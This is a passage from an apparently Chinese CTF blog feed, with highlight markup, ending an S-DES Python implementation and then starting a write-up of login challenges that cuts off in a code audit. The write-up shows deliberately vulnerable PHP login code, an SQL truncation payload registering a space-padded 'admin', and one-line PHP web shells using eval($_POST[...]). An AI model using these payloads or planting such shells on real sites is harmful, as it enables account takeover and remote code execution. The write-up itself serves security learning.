class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">P8</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">P4</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">S0</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    row <span class="token operator">=</span> bin_to_int<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    col <span class="token operator">=</span> bin_to_int<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"00"</span> <span class="token punctuation">,</span><span class="token string">"11"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"11"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"00"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"11"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">]</span>            <span class="token punctuation">]</span>    <span class="token keyword">return</span> box<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">S1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    row <span class="token operator">=</span> bin_to_int<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    col <span class="token operator">=</span> bin_to_int<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"11"</span><span class="token punctuation">,</span> <span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"00"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"01"</span><span class="token punctuation">,</span> <span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">]</span>            <span class="token punctuation">]</span>    <span class="token keyword">return</span> box<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">IP</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">IP_1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">E_P</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> data<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">XOR</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> int<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">LS</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> data<span class="token punctuation">[</span>amount<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>amount<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">SW</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    data1<span class="token punctuation">,</span> data2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> data2 <span class="token operator">+</span> data1<span class="token keyword">def</span> <span class="token function">split_half</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">int_to_bin</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"{0:b}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bin_to_int</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> int<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_round_keys</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>    round_keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    k_h1<span class="token punctuation">,</span> k_h2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>P10<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> rounds <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> i        h1<span class="token punctuation">,</span> h2 <span class="token operator">=</span> LS<span class="token punctuation">(</span>k_h1<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">,</span> LS<span class="token punctuation">(</span>k_h2<span class="token punctuation">,</span> s<span class="token punctuation">)</span>        round_keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>P8<span class="token punctuation">(</span>h1 <span class="token operator">+</span> h2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> round_keys<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    round_keys <span class="token operator">=</span> generate_round_keys<span class="token punctuation">(</span>key<span class="token punctuation">,</span> rounds<span class="token punctuation">)</span>    ip1<span class="token punctuation">,</span> ip2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip1 <span class="token operator">+</span> ip2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> r_key <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>round_keys<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> E_P<span class="token punctuation">(</span>ip2<span class="token punctuation">)</span>        data <span class="token operator">=</span> XOR<span class="token punctuation">(</span>data<span class="token punctuation">,</span> r_key<span class="token punctuation">)</span>        d1<span class="token punctuation">,</span> d2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        d1 <span class="token operator">=</span> S0<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>        d2 <span class="token operator">=</span> S1<span class="token punctuation">(</span>d2<span class="token punctuation">)</span>        data <span class="token operator">=</span> XOR<span class="token punctuation">(</span>ip1<span class="token punctuation">,</span> P4<span class="token punctuation">(</span>d1 <span class="token operator">+</span> d2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> ip2        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"First Fk: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Second Fk: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> len<span class="token punctuation">(</span>round_keys<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>            ip1<span class="token punctuation">,</span> ip2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>SW<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SW: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip1 <span class="token operator">+</span> ip2<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            ciphertext <span class="token operator">=</span> IP_1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP-1: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> comments<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    round_keys <span class="token operator">=</span> list<span class="token punctuation">(</span>reversed<span class="token punctuation">(</span>generate_round_keys<span class="token punctuation">(</span>key<span class="token punctuation">,</span> rounds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip1<span class="token punctuation">,</span> ip2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> comments<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip1 <span class="token operator">+</span> ip2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> r_key <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>round_keys<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> E_P<span class="token punctuation">(</span>ip2<span class="token punctuation">)</span>        data <span class="token operator">=</span> XOR<span class="token punctuation">(</span>data<span class="token punctuation">,</span> r_key<span class="token punctuation">)</span>        d1<span class="token punctuation">,</span> d2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        d1 <span class="token operator">=</span> S0<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>        d2 <span class="token operator">=</span> S1<span class="token punctuation">(</span>d2<span class="token punctuation">)</span>        data <span class="token operator">=</span> XOR<span class="token punctuation">(</span>ip1<span class="token punctuation">,</span> P4<span class="token punctuation">(</span>d1 <span class="token operator">+</span> d2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> ip2        <span class="token keyword">if</span> comments <span class="token operator">and</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"First Fk: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> comments <span class="token operator">and</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Second Fk: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> len<span class="token punctuation">(</span>round_keys<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>            ip1<span class="token punctuation">,</span> ip2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>SW<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> comments<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SW: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip1 <span class="token operator">+</span> ip2<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            plaintext <span class="token operator">=</span> IP_1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> comments<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP-1: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> plaintext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"需要加密的明文为: {} ({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> bin_to_ascii_4bit<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Key: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n以下是加密的过程\n-------------------\n"</span><span class="token punctuation">)</span>    C<span class="token operator">=</span> encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span>K<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的密文为:  {} ({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>C<span class="token punctuation">,</span> bin_to_ascii_4bit<span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n以下是解密的过程\n-------------------\n"</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>C<span class="token punctuation">,</span> K<span class="token punctuation">,</span> comments<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的明文是: {} ({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>d<span class="token punctuation">,</span> bin_to_ascii_4bit<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>令人窒息的登录题</title>
      <link href="/2019/08/10/za-qi-za-ba-de-deng-lu-ti/"/>
      <url>/2019/08/10/za-qi-za-ba-de-deng-lu-ti/</url>
      
        <content type="html"><![CDATA[<h4 id="一、约束攻击，啥玩意？"><a href="#一、约束攻击，啥玩意？" class="headerlink" title="一、约束攻击，啥玩意？"></a>一、约束攻击，啥玩意？</h4><p>假如有这么一个登录注册业务<br>注册</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// Checking whether a user with the same username exists</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users  WHERE username='$username'"</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// User exists, exit gracefully</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// If not, only then insert a new entry</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO users(username, password) VALUES ('$username','$password')"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><a id="more"></a><p>登录</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> "<span class="token constant">SELECT</span> username <span class="token constant">FROM</span> users          <span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token string">'$username'</span>              <span class="token keyword">AND</span> password<span class="token operator">=</span><span class="token string">'$password'</span> "<span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token keyword">Null</span><span class="token punctuation">;</span></code></pre><p>发生原因<br>1.mysql处于ANSI模式。如果是TRADITIONAL模式或者STRICT_TRANS_TABLES模式会报错data too long for column。<br>2.服务端没有对用户名长度进行限制。如果服务端限制了用户名长度就自然就不客能导致数据库截断，也就没有利用条件。<br>3.登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码然后再比对密码，当使用vampire为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条即目标用户的记录，那么传输的密码肯定和目标用户密码匹配不上的。<br>4.验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户vampire和密码random_pass登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是vampire+若干个空格，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。<br>payload</p><pre><code>注册一个账号为admin                        1 密码随意即可登录获取flag</code></pre><p>写入一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'index1.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[c]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"aka.php"</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval(\$_POST[aka]);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="百度杯”CTF比赛-十月场-—–Login"><a href="#百度杯”CTF比赛-十月场-—–Login" class="headerlink" title="百度杯”CTF比赛 十月场 —–Login"></a>百度杯”CTF比赛 十月场 —–Login</h4><p>先test1,test1登录，请求头中有个show:0改成1，看到代码，就是代码审计咯</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string">'common.php'</span><span class="token punctuation">;</span>    <span class="token variable">$requset</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">db</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$where</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">where</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token 